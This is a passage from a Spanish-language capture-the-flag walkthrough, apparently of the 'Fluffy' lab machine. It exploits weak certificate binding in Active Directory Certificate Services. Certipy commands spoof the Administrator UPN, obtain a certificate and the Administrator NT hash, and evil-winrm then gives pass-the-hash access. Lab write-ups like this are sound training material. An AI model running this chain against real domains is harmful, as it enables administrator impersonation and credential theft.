    DisableExtensionList    REG_MULTI_SZ    1.3.6.1.4.1.311.25.2
~~~

Además comprobaremos el valor de `StrongCertificateBindingEnforcement`, para verificar que se encuentre en `0` o `1`. Sabremos que podemos aprovechar un mapeo débil para suplantar a un usuario privilegiado

~~~ powershell
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc /v StrongCertificateBindingEnforcement

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc
    StrongCertificateBindingEnforcement    REG_DWORD    0x0
~~~

### Exploiting

Comenzaremos el ataque cambiando el UPN (`User Principal Name`) de la cuenta `ca_svc`, para que coincida con el UPN del usuario `Administrator` 

 ~~~ bash
certipy account update -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -user ca_svc -upn administrator -dc-ip 10.10.11.69 

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
~~~

Procederemos a solicitar un certificado que permita autenticación, como la plantilla `User`

~~~ bash
certipy req -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -ca fluffy-DC01-CA -template User  -dc-ip 10.10.11.69
     
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 42
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
~~~

Revertiremos el cambio de UPN en la cuenta `ca_svc` para evitar errores a la hora de realizar la autenticación (en `certipy` podríamos ver el siguiente: `[-] Name mismatch between certificate and user 'administrator'`)

~~~ bash
certipy account update -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -user ca_svc -upn ca_svc@fluffy.htb -dc-ip 10.10.11.69

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
~~~

Usaremos el certificado para autenticarnos como el usuario `Administrator` y así poder obtener su hash NT y credenciales en caché

> Cuando realices la autenticación, recuerda sincronizar tu reloj con el DC, puedes ejecutar el comando `ntpdate DC01.fluffy.htb`
{: .notice--danger}

~~~ bash
ntpdate DC01.fluffy.htb

certipy auth -pfx administrator.pfx -dc-ip 10.10.11.69 -username administrator -domain fluffy.htb
                             
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
~~~


## Root Time

Con el hash NT del usuario `Administrator`, ya podremos conectarnos a la máquina haciendo PassTheHash

~~~ bash
evil-winrm-py -i 10.10.11.69 -u Administrator -H 8da83a3fa618b6e3a00e93f676c92a6e

        ▘▜      ▘             
    █▌▌▌▌▐ ▄▖▌▌▌▌▛▌▛▘▛▛▌▄▖▛▌▌▌
    ▙▖▚▘▌▐▖  ▚▚▘▌▌▌▌ ▌▌▌  ▙▌▙▌
                          ▌ ▄▌ v1.1.2
[*] Connecting to 10.10.11.69:5985 as Administrator

evil-winrm-py PS C:\Users\Administrator\Documents> whoami
fluffy\administrator
~~~

Ya podremos ver la flag del sistema ubicada en el escritorio

~~~ bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt 
fed...
~~~
<br>
Gracias por leer este artículo, espero te haya sido de ayuda. Te dejo la cita del día:

> Wishes can be your best avenue of getting what you want when you turn wishes into action. Action moves your wish to the forefront from thought to reality.
> — Byron Pulsifer
{: .notice--info}
